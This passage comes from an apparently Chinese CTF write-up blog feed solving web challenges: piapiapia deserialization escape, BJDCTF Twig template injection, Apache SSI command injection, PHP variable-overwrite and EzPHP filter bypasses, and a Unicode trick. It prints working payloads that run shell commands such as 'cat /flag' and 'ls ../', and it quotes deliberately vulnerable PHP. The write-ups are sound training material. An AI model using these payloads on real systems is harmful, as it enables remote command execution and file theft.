<p>abc前面的s:3:不变，因为是序列化的时候固定了<br> 我们将abc构造成：abc”;i:2;s:5:”qwert”;}我们再最后构造了一个闭合，导致defg被丢弃，qwert占用了defg原本的位置<br>  还是回到这一道题上，我们的目的是将”;}s:5:”photo”;s:10:”config.php”;}插入序列化的字符串里面去，这个的长度为34，所以我们要挤出来34位，不然就成了nickname的值了。where会替换成hacker，长度加1，所以我们要构造34个where。然后去profile.php查看读取的内容。</p>
<h3 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h3><ul>
<li>注册账户</li>
<li>登录账户</li>
<li>随意提交一些资料抓包</li>
<li>修改nickname为nickname[]，数组绕过长度检测</li>
<li>修改nickname中的内容</li>
</ul>
<pre class=" language-php"><code class="language-php">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="token string">";}s:5:"</span>photo<span class="token string">";s:10:"</span>config<span class="token punctuation">.</span>php"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p><img src="/2021/07/12/0ctf-2016-piapiapia/image-20210712010334089.png" alt="image-20210712010334089"></p>
<p>然后点击跳转到profile.php,f12查看并base64解码</p>
<p><img src="/2021/07/12/0ctf-2016-piapiapia/image-20210712010116364.png" alt="image-20210712010116364"></p>
<p><img src="/2021/07/12/0ctf-2016-piapiapia/image-20210712010058578.png" alt="image-20210712010058578"></p>
]]></content>
      <tags>
        <tag>反序列化字符逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF:2020-CookieIsSoStable</title>
    <url>/2021/07/04/bjdctf-2020-cookieissostable/</url>
    <content><![CDATA[<p><img src="/2021/07/04/bjdctf-2020-cookieissostable/image-20210709222509040.png" alt="image-20210709222509040"></p>
<pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}{{{_self.env.getFilter("id")}}</code></pre>
<p><img src="/2021/07/04/bjdctf-2020-cookieissostable/image-20210709221716988.png" alt="image-20210709221716988"></p>
<pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre>
<p><img src="/2021/07/04/bjdctf-2020-cookieissostable/image-20210709222027216.png" alt="image-20210709222027216"></p>
]]></content>
  </entry>
  <entry>
    <title>ASIS:2019-UnicornShop</title>
    <url>/2021/07/03/asis-2019-unicornshop/</url>
    <content><![CDATA[<p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709165333232.png" alt="image-20210709165333232"></p>
<p>在purchase输入 1 3</p>
<p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709165354072.png" alt="image-20210709165354072"></p>
<p>在purchase输入 1 10</p>
<p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709165411956.png" alt="image-20210709165411956"></p>
<p>发现只能输入一个字符</p>
<p>Unicode编码安全问题:<a href="https://gality.cn/?p=123">https://gality.cn/?p=123</a></p>
<p>利用UTF-8编码安全转换问题找一个大于1337的字符</p>
<p><a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p>
<p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709170804114.png" alt="image-20210709170804114"></p>
<p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709170918673.png" alt="image-20210709170918673"></p>
<p>它的UTF-8编码:</p>
<p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709171017362.png" alt="image-20210709171017362"></p>
<p>所以在purchase输入4 %E1%8D%BC</p>
<p><img src="/2021/07/03/asis-2019-unicornshop/image-20210709165306391.png" alt="image-20210709165306391"></p>
]]></content>
      <tags>
        <tag>Unicode安全</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF:2020-EasySearch</title>
    <url>/2021/07/20/bjdctf-2020-easysearch/</url>
    <content><![CDATA[<h2 id="ApacheSSI远程命令执行漏洞"><a href="#ApacheSSI远程命令执行漏洞" class="headerlink" title="ApacheSSI远程命令执行漏洞"></a>ApacheSSI远程命令执行漏洞</h2><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p>
<h2 id="BJDCTF-2020-EasySearch"><a href="#BJDCTF-2020-EasySearch" class="headerlink" title="BJDCTF:2020-EasySearch"></a>BJDCTF:2020-EasySearch</h2><p><img src="/2021/07/20/bjdctf-2020-easysearch/1.png" alt="1"></p>
<p>扫描到了index.php.swp</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span>
        <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Random 5 times</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$random</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>
            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string">"public/"</span><span class="token punctuation">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".shtml"</span><span class="token punctuation">;</span>
            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$text</span> <span class="token operator">=</span> '
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Hello<span class="token punctuation">,</span><span class="token string">'.$_POST['</span>username<span class="token string">'].'</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>'<span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token keyword">echo</span> <span class="token string">"[!] Header  error ..."</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span><span class="token keyword">else</span>
    <span class="token punctuation">{</span>
    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
    <span class="token punctuation">}</span>
    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>
<p><img src="/2021/07/20/bjdctf-2020-easysearch/2.png" alt="2"></p>
<p><img src="/2021/07/20/bjdctf-2020-easysearch/3.png" alt="3"></p>
<p>看到有个shtml文件，推测：Apache SSI 远程命令执行漏洞，只能在username进行注入：</p>
<pre><code>&lt;!--#exec cmd="ls ../"--&gt;</code></pre>
<p><img src="/2021/07/20/bjdctf-2020-easysearch/4.png" alt="4"></p>
<p><strong>访问url/public/dd95b8ad08dd3c2dc922651bcf926300acf0a5d2.shtml</strong></p>
<p><img src="/2021/07/20/bjdctf-2020-easysearch/5.png" alt="5"></p>
<p>访问这个flag</p>
<p><img src="/2021/07/20/bjdctf-2020-easysearch/6.png" alt="6"></p>
<p>或者</p>
<pre><code>&lt;!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2" --&gt;</code></pre>
]]></content>
      <tags>
        <tag>ApacheSSI远程命令执行漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF:2020-MarkLovesCat</title>
    <url>/2021/06/22/bjdctf-2020-marklovescat/</url>
    <content><![CDATA[<pre><code>git_extract.py http://1634afca-44d6-449e-a0d4-f617d25e10be.node3.buuoj.cn/.git/</code></pre>
<p><img src="/2021/06/22/bjdctf-2020-marklovescat/image-20210622095427710.png" alt="image-20210622095427710"></p>
<p><img src="/2021/06/22/bjdctf-2020-marklovescat/image-20210622095443939.png" alt="image-20210622095443939"></p>
<h5 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h5><pre><code>&lt;?php

$flag = file_get_contents('/flag');</code></pre>
<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><pre><code>&lt;?php
include 'flag.php';
$yds = "dog";
$is = "cat";
$handsome = 'yds';
foreach($_POST as $x =&gt; $y){
    $$x = $y;
}
foreach($_GET as $x =&gt; $y){
    $$x = $$y;
}
foreach($_GET as $x =&gt; $y){
    if($_GET['flag'] === $x &amp;&amp; $x !== 'flag'){
        exit($handsome);
    }
}
if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){
    exit($yds);
}
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
echo "the flag is: ".$flag;</code></pre>
<pre><code>yds=flag</code></pre>
<pre><code>is=flag&amp;flag=flag</code></pre>
]]></content>
  </entry>
  <entry>
    <title>BJDCTF：2020-EzPHP</title>
    <url>/2021/09/28/bjdctf-2020-ezphp/</url>
    <content><![CDATA[<p><img src="/BJDCTF%EF%BC%9A2020-EzPHP.assets/image-20210816183237244.png" alt="image-20210816183237244"></p>
<p>F12</p>
<p><img src="/BJDCTF%EF%BC%9A2020-EzPHP.assets/image-20210816183257665.png" alt="image-20210816183257665"></p>
<p>base32解码1nD3x.php</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span>
<span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>
        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>  
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
        <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> 

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token delimiter">?></span> </code></pre>
<p>关于第一处限制：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>
        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>  
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> </code></pre>
<p>关于<code>$_SERVER['QUERY_STRING']</code>.他验证的时候是不会进行url解码的，但是在GET的时候则会进行url解码，所以我们只需要将关键词编码就能绕过。’’</p>
<p>关于第二处限制：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><code>preg_match</code>值匹配第一行，句尾加上%0a进行绕过，绕过<code>preg_match</code>主要有两种方法即换行符与PRCE回溯此处超出。</p>
<p>payload：<code>dedu=aqua_is_cute%0a</code></p>
<p>关于第三处限制：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span>  </code></pre>
<p><code>$_REQUEST</code>方式接收请求是存在优先级别的，如果同时接受GET和POST的数据，默认情况下POST具有优先权，所以只需要在get的同时post数字即可。</p>
<p>payload：<code>POST：debu=1&amp;file=1</code></p>
<p>关于第四处限制：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
<p>这里利用data协议即可：<code>file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61</code></p>
<p>与此同时file也需要被post一下。</p>
<p>关于第四处限制：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> </code></pre>
<p>这里利用数组进行一下绕过就可以了，因为当sha1()的参数为数组，此时就会返回false。</p>
<p>payload：<br> <code>shana[]=1&amp;passwd[]=2</code>  </p>
<p>关于第五处限制：  </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre>
<p>这里利用到了<code>create_function()</code>代码注入。</p>
<p><code>create_function()</code>函数有两个参数$args和$code，用于创建一个lambda样式的函数</p>
<p>例如：<code>$myfunc = create_function('$a, $b', 'return $a+$b;');</code><br> 相当于：  </p>
<pre><code>function myfunc($a, $b){
    return $a+$b;
}    </code></pre>
